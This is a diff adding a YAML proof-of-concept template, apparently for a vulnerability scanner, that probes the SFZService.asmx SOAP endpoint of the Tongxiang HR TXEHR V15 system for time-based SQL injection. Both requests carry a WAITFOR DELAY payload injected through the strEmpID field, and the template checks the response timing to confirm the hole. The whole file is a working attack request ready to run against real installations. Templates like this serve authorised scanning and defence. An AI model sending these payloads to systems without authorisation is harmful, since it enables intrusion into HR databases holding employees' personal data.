@@ -1,0 +1,48 @@
+name: poc-yaml-tongxiangHR-TXEHR-V15-SFZService.asmx-sql
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Service/SFZService.asmx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetJianLiByEmpID"
+      body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+         <soap:Body>
+          <GetJianLiByEmpID xmlns="http://tempuri.org/">
+           <strEmpID>1';WAITFOR DELAY '0:0:4'--</strEmpID>
+          </GetJianLiByEmpID>
+         </soap:Body>
+        </soap:Envelope>
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /Service/SFZService.asmx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetJianLiByEmpID"
+      body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+         <soap:Body>
+          <GetJianLiByEmpID xmlns="http://tempuri.org/">
+           <strEmpID>1';WAITFOR DELAY '0:0:8'--</strEmpID>
+          </GetJianLiByEmpID>
+         </soap:Body>
+        </soap:Envelope>
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486815&idx=1&sn=f0f94a18f1ba06fdb291fdafb2311678&chksm=c267b86cf510317ad3dacb85e241cefa41d197d9f75365b7ec553b5cb907ebe27874a85c46df&token=522460222&lang=zh_CN#rd
